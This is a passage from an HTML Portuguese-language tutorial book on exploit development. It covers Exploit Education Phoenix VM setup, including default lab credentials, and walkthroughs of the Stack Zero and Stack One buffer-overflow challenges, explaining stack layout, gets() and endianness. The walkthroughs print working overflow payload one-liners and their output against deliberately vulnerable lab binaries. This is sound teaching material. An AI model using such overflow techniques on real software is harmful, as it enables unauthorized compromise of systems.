<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/stack.html"><strong>2.</strong> Stack</a></li><li><a href="./stack/phoenix/setup.html"><strong>3.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>3.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>3.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>3.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>3.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>3.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>3.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>3.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> MitigaÃ§Ãµes</a></li><li><a href="./stack/ret2libc.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six</li><li><strong>5.2.</strong> AvanÃ§ado: MÃºltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>6.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.3.</strong> SROP</a></li></ul></li><li><a href="./stack/ASLR/aslr.html"><strong>8.</strong> ASLR</a></li><li><ul class="section"><li><a href="./stack/ASLR/corromperGOT.html"><strong>8.1.</strong> Corromper GOT</a></li><li><a href="./stack/ASLR/ret2plt.html"><strong>8.2.</strong> ret2plt</a></li><li><a href="./stack/ASLR/brute32.html"><strong>8.3.</strong> Bruteforce</a></li></ul></li><li><strong>9.</strong> Canary</li><li><strong>10.</strong> PIE</li><li><a href="./stack/leakAll.html"><strong>11.</strong> Extra: Leakando tudo</a></li><li class="spacer"></li><li><a href="./heap/heap.html"><strong>12.</strong> Heap</a></li><li><a href="./heap/intro.html"><strong>13.</strong> Intro</a></li><li><strong>14.</strong> Bugs Gerais</li><li><ul class="section"><li><strong>14.1.</strong> UAF</li><li><ul class="section"><li><a href="./heap/geral/uaf/heap-two.html"><strong>14.1.1.</strong> Exploit Education: Heap Two</a></li></ul></li></ul></li><li><strong>15.</strong> Atacando Malloc</li><li><ul class="section"><li><strong>15.1.</strong> BÃ¡sico</li><li><ul class="section"><li><strong>15.1.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>15.1.2.</strong> House of Force</a></li><li><strong>15.1.3.</strong> Unsafe Unlink</li><li><strong>15.1.4.</strong> Safe Unlink</li><li><strong>15.1.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>15.1.6.</strong> Chunk Faking</li></ul></li><li><strong>15.2.</strong> IntermediÃ¡rio</li><li><ul class="section"><li><strong>15.2.1.</strong> House of Orange</li><li><ul class="section"><li><strong>15.2.1.1.</strong> File Stream Exploitation</li><li><strong>15.2.1.2.</strong> Heap Extension</li><li><strong>15.2.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>15.2.2.</strong> House of Spirit</li></ul></li><li><strong>15.3.</strong> AvanÃ§ado</li><li><ul class="section"><li><strong>15.3.1.</strong> House of Rust</li><li class="spacer"></li></ul></li></ul></li><li><a href="./linux_internals/linux.html"><strong>16.</strong> Linux Internals</a></li><li><a href="./linux_internals/prerequisitos.html"><strong>17.</strong> Prerequisitos</a></li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <a class="header" href="print.html#mapa" id="mapa"><h1>Mapa</h1></a>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<p>RecomendaÃ§Ã£o:</p>
<pre><code>                    Stack                                   |
                      |                                     | Continuamente:
   ___________________|___________________                  | 
  |                   |                   |                 | Uma dose saudÃ¡vel 
  V                   V                   V                 | de fuzzing
Heap                Kernel        Outras Arquiteturas       | 
              ________|________                             | :D
             |                 |                            |
             V                 V                            |
            Win               Linux                         v
</code></pre>
<a class="header" href="print.html#stack" id="stack"><h2>Stack</h2></a>
<pre><code>Phoenix Stack:
BoF Tradicional, Assembly,... etc
     |__________ _______________ ____
     |          |               |    |        
     V          V               |    V
    W^X     GOT e PLT           | Canary
     |          |_________      V    |                 
     |          |         |    PIE   |
     V          V         V     |    |
  Ret2libC     ASLR     RELRO   |    |
     |          |               |    |
     |          V__ ____________V_ __V        
     |             |              |
     V             V              V
    ROP           Leak          Brute     
 ____|____     
|         |   
V         V   
SROP   ret2dl_resolve 
</code></pre>
<a class="header" href="print.html#fuzz" id="fuzz"><h2>Fuzz</h2></a>
<pre><code>Fuzz
  |
  |____________ ____________ 
  |            |            |
  V            V            V 
 GenÃ©tico     Taint       Symbolic
  |           Analysis    Exec
  V            |______ _____|
 AFL+                 |
 ASAN                 | 
                      V
                    Angr

</code></pre>
<a class="header" href="print.html#heap-todo" id="heap-todo"><h2>Heap ~TODO~</h2></a>
<pre><code></code></pre>
<a class="header" href="print.html#linux-internals-todo" id="linux-internals-todo"><h2>Linux Internals ~TODO~</h2></a>
<pre><code></code></pre>
<a class="header" href="print.html#stack-1" id="stack-1"><h1>Stack</h1></a>
<p>Nesse capitulo vamos aprender sobre:</p>
<ul>
<li>IntroduÃ§Ã£o a Assembly e conceitos relacionados!</li>
<li>Buffer Overflow ClÃ¡ssico</li>
<li>MitigaÃ§Ãµes comuns e como derrota-las:
<ul>
<li>W^X</li>
<li>ASLR</li>
<li>Canary</li>
<li>PIE</li>
<li>RELRO</li>
</ul>
</li>
<li>ROP AvanÃ§ado </li>
</ul>
<p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong></p>
<p>Inspiracao (ingles):</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas Ã© sobre o antigo: Protostar)</a></p>
<a class="header" href="print.html#-prerequisitos" id="-prerequisitos"><h1>ğŸ–¥ï¸ Prerequisitos:</h1></a>
<ul>
<li>Saber alguma linguagem de programaÃ§Ã£o e conceitos relacionados</li>
</ul>
<a class="header" href="print.html#-opcional-mas-util-saber" id="-opcional-mas-util-saber"><h1>ğŸ§ Opcional mas util saber</h1></a>
<ul>
<li>ğŸ’¾ Um pouco de C / C++ / Rust / Linguagem de nÃ­vel baixo</li>
<li>ğŸ Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>ğŸ§ Saber o bÃ¡sico de Linux</li>
</ul>
<a class="header" href="print.html#-setup" id="-setup"><h1>ğŸ¤– Setup:</h1></a>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>NÃ‚O USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Minimiza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usuÃ¡rios/senha sÃ£o: user/user e root/root</li>
<li>Os arquivos tÃ£o em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<ul>
<li><a href="print.html#-descri%C3%A7%C3%A3o">ğŸ“ DescriÃ§Ã£o</a></li>
<li><a href="print.html#-dica">ğŸ’¡ Dica</a></li>
<li><a href="print.html#conhecimento-preliminar">Conhecimento Preliminar</a>
<ul>
<li><a href="print.html#buffer">Buffer</a></li>
<li><a href="print.html#stack">Stack</a>
<ul>
<li><a href="print.html#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></li>
<li><a href="print.html#hex">Hex</a></li>
<li><a href="print.html#melhorando-o-exemplo-do-po%C3%A7o">Melhorando o exemplo do poÃ§o</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">ğŸ‰ ExplicaÃ§Ã£o</a>
<ul>
<li><a href="print.html#-1--alocando-as-vari%C3%A1veis-na-stack-buffer64-changeme">ğŸ¥ 1- Alocando as variÃ¡veis na stack (buffer[64], changeme)</a></li>
<li><a href="print.html#-2--alterar-buffer64-usando-gets">ğŸ’¥ 2- Alterar buffer[64] usando gets</a></li>
<li><a href="print.html#-3--o-programa-checa-se-changeme-foi-alterada">âœ… 3- O programa checa se changeme foi alterada</a>
<ul>
<li><a href="print.html#-64-as-changeme-n%C3%A3o-alterado">âŒ 64 As, changeme nÃ£o alterado</a></li>
<li><a href="print.html#-65-as-changeme-alterado">âœ… 65 As, changeme alterado</a></li>
<li><a href="print.html#%EF%B8%8F-64-as-e-um-b-0x42-aaaaaaaaaaaab">ğŸ…±ï¸ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ‘¾ SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-descriÃ§Ã£o" id="-descriÃ§Ã£o"><h1>ğŸ“ DescriÃ§Ã£o</h1></a>
<p>Esse nÃ­vel demonstra que memoria pode ser acessada fora da sua regiÃ£o
inicialmente alocada, como as variÃ¡veis sÃ£o alocadas na stack, e que altera-las pode mudar a execuÃ§Ã£o do programa.</p>
<p>Objetivo: Alterar a variÃ¡vel &quot;changeme&quot;</p>
<a class="header" href="print.html#-dica" id="-dica"><h1>ğŸ’¡ Dica</h1></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<a class="header" href="print.html#conhecimento-preliminar" id="conhecimento-preliminar"><h1>Conhecimento Preliminar</h1></a>
<a class="header" href="print.html#buffer" id="buffer"><h2>Buffer</h2></a>
<p>Buffers sÃ£o similares a arrays em outras linguagens de programaÃ§Ã£o,
mas possuem tamanho fixo!</p>
<p>Eles sÃ£o definidos usando: <code>tipo nome[tamanho]</code></p>
<p>O <code>tipo</code>, Ã© do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possuÃ­rem tamanho fixo, sÃ£o armazenados na stack!</p>
<a class="header" href="print.html#stack-2" id="stack-2"><h2>Stack</h2></a>
<p>A stack Ã© uma porÃ§Ã£o da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando vocÃª quer colocar um novo, vocÃª coloca no topo da pilha (push)
Quando vocÃª quer pegar um da pilha, vocÃª pega o do topo (pop)

O ultimo a entrar, Ã© o primeiro a sair...
o nome desse comportamento Ã© LIFO (Last in First Out)
</code></pre>
<p><img src="./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<a class="header" href="print.html#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores"><h3>A stack cresce para valores menores</h3></a>
<pre><code>Imagina que ela Ã© um poÃ§o que comeÃ§a na profundidade 15

Quando vocÃª coloca um objeto de tamanho 2 no poÃ§o:
ele vai estar apoiado na profundidade 15, e vai atÃ© a profundidade 13

Em seguida, vocÃª coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai atÃ© a profundidade 10
</code></pre>
<p>Conforme vocÃª vai <strong>adicionando</strong> itens, o endereÃ§o que eles estÃ£o vai <strong>diminuindo</strong> em valor.
Ã‰ meio confuso, mas com o tempo vocÃª pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endereÃ§os tÃ£o em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; Ã© pra representar que o valor tÃ¡ em hex).</p>
<a class="header" href="print.html#hex" id="hex"><h3>Hex</h3></a>
<p>Se vc nÃ£o souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numeraÃ§Ã£o hexadecimal</a>
. Mas resumindo, em hex vocÃª conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>EntÃ£o a base da stack Ã© 0xFFFFFFFF e o topo 0X00000000 !</p>
<a class="header" href="print.html#melhorando-o-exemplo-do-poÃ§o" id="melhorando-o-exemplo-do-poÃ§o"><h3>Melhorando o exemplo do poÃ§o</h3></a>
<pre><code>0x0- 	     Topo da stack/Topo do poÃ§o
0xA ate 0x1- espaÃ§o vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do poÃ§o, primeiro item
</code></pre>
<a class="header" href="print.html#-explicaÃ§Ã£o" id="-explicaÃ§Ã£o"><h1>ğŸ‰ ExplicaÃ§Ã£o</h1></a>
<p>A funÃ§Ã£o main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>ğŸ¥ Alocando as variÃ¡veis na stack (buffer[64], changeme)</li>
<li>ğŸ’¥ Alterar buffer[64] usando gets()</li>
<li>âœ… Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
            // Definir variÃ¡veis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nÃ­vel faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela nÃ£o deveria estar mudando!</p>
<p>Calma que vocÃª ja vai entender :)</p>
<a class="header" href="print.html#-1--alocando-as-variÃ¡veis-na-stack-buffer64-changeme" id="-1--alocando-as-variÃ¡veis-na-stack-buffer64-changeme"><h2>ğŸ¥ 1- Alocando as variÃ¡veis na stack (buffer[64], changeme)</h2></a>
<p>A variÃ¡vel <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A variÃ¡vel <code>changeme</code> esta marcada como <code>volÃ¡til</code> para prevenir que o compilador
destrua ela (pq originalmente nÃ£o seria
alterada, entÃ£o seria destruÃ­da para otimizar o cÃ³digo...
Mas nÃ³s vamos alterar ela por mÃ©todos... ~risada malÃ©fica~ ... nÃ£o convencionais hehehe).</p>
<p>Nossas duas variÃ¡veis (buffer[64] e changeme) sÃ£o empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<a class="header" href="print.html#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets"><h2>ğŸ’¥ 2- Alterar buffer[64] usando gets</h2></a>
<p>A funÃ§Ã£o <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema Ã© que ela <strong>nÃ£o</strong> checa se o valor recebido Ã© maior que o <code>buffer</code>, permitindo que
vocÃª <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai comeÃ§ar a escrever no topo do buffer (menor endereÃ§o)
e vai descendo atÃ© a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>EntÃ£o, caso colocÃ¡ssemos 100 &quot;A&quot;s no buffer de tamanho 64, as variÃ¡veis nos prÃ³ximos 36 endereÃ§os seriam alteradas.</p>
<p>Essas variÃ¡veis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; Ã© 0x41, vocÃª pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usuÃ¡rio pode escrever fora memoria dele? perigoso ne! D:</p>
<p>Ã‰ por isso que essa funÃ§Ã£o estÃ¡ marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a variÃ¡vel <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<a class="header" href="print.html#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada"><h2>âœ… 3- O programa checa se changeme foi alterada</h2></a>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, Ã© vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na prÃ¡tica?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>EntÃ£o se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se vocÃª quer tentar resolver sozinhe, agora Ã© a sua hora!

.
.
.
.
</code></pre>
<a class="header" href="print.html#-64-as-changeme-nÃ£o-alterado" id="-64-as-changeme-nÃ£o-alterado"><h3>âŒ 64 As, changeme nÃ£o alterado</h3></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<a class="header" href="print.html#-65-as-changeme-alterado" id="-65-as-changeme-alterado"><h3>âœ… 65 As, changeme alterado</h3></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<a class="header" href="print.html#ğŸ…±-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="ğŸ…±-64-as-e-um-b-0x42-aaaaaaaaaaaab"><h3>ğŸ…±ï¸ 64 As e um B (0x42): AAAAAAAAA.....AAAB</h3></a>
<p>Para demonstrar melhor esse comportamento do buffer
ser escrito em um sentido especÃ­fico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code></p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variÃ¡vel!! Uhhuuu :D</p>
<p>Esses As sÃ³ pra encher a stack sÃ£o chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explicaÃ§Ã£o, mas relaxa que daqui pra frente fica mais difÃ­cil hehehe :D</p>
<p>Se vocÃª chegou atÃ© aqui, vocÃª ta de parabÃ©ns !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variÃ¡veis e no buffer, mostra o sentido que o
buffer escreve, e ele vazando e mudando o valor das outras variÃ¡veis...</p>
<a class="header" href="print.html#-soluÃ§Ã£o" id="-soluÃ§Ã£o"><h1>ğŸ‘¾ SoluÃ§Ã£o</h1></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<ul>
<li><a href="print.html#-objetivo">ğŸ¯ Objetivo</a></li>
<li><a href="print.html#-dicas">ğŸ’¡ Dicas</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">ğŸ’« ExplicaÃ§Ã£o</a>
<ul>
<li><a href="print.html#input">Input</a></li>
<li><a href="print.html#endian">Endian</a>
<ul>
<li><a href="print.html#-dica-usando-valores-hex-diretamente">ğŸŒ™ Dica: Usando valores hex diretamente</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ”¥ SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-objetivo" id="-objetivo"><h1>ğŸ¯ Objetivo</h1></a>
<p>Agora o objetivo nÃ£o Ã© sÃ³ alterar <code>changeme</code>, Ã© alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois Ã©, ele vai ser super util agora!</p>
<a class="header" href="print.html#-dicas" id="-dicas"><h1>ğŸ’¡ Dicas</h1></a>
<p>Ver a representaÃ§Ã£o hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<a class="header" href="print.html#-explicaÃ§Ã£o-1" id="-explicaÃ§Ã£o-1"><h1>ğŸ’« ExplicaÃ§Ã£o</h1></a>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por trÃ¡s das cenas Ã© que as letras estÃ£o virando a sua representaÃ§Ã£o hex.</p>
<p>EntÃ£o <code>print(&quot;A&quot;*5)</code> Ã© equivalente Ã  <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta atenÃ§Ã£o no b&quot;&quot; : esse b indica que sÃ£o Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de vocÃª usar valores arbitrÃ¡rios pra esses bytes,
entÃ£o vocÃª pode usar o python2 (o print nÃ£o tem parÃªnteses, mas o resto Ã© igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
                to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, entÃ£o podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<a class="header" href="print.html#input" id="input"><h2>Input</h2></a>
<p>Nesse caso, o programa nÃ£o ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
vocÃª executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>argv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc Ã© a contagem: quantas coisas tem no argv! E aqui tÃ¡ checando se Ã© menor que 2!</p>
</blockquote>
<p>entÃ£o no nosso caso, para mandar o input do python para o argv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos parÃªnteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>entÃ£o <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<a class="header" href="print.html#endian" id="endian"><h2>Endian</h2></a>
<p>O valor de changeme tem tamanho 4 bytes, pq ele Ã© um integer (integers sÃ£o 32 ou 64 bits, entÃ£o 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os nÃºmeros sÃ£o representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos dÃ­gitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros sÃ£o representados em ordem decrescente CDU.</p>
</blockquote>
<blockquote>
<p>Em um sistema LE, os numeros sÃ£o representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte trÃªs:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, entÃ£o eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>EntÃ£o pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu nÃ£o sei que letras sÃ£o equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<a class="header" href="print.html#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente"><h3>ğŸŒ™ Dica: Usando valores hex diretamente</h3></a>
<p>Lembra que eu falei que letras sÃ£o valores hex? A gente tambÃ©m pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>EntÃ£o usar b&quot;\x41&quot; Ã© igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria!</p>
<p>Caso vocÃª queira usar as letras, voce pode tambÃ©m!</p>
<p>EntÃ£o <code>b'\x62\x59\x6c\x49'</code> Ã© equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte nÃ£o tem um correspondente vÃ¡lido? Vc usa <code>&quot;\x&quot;</code> :D</p>
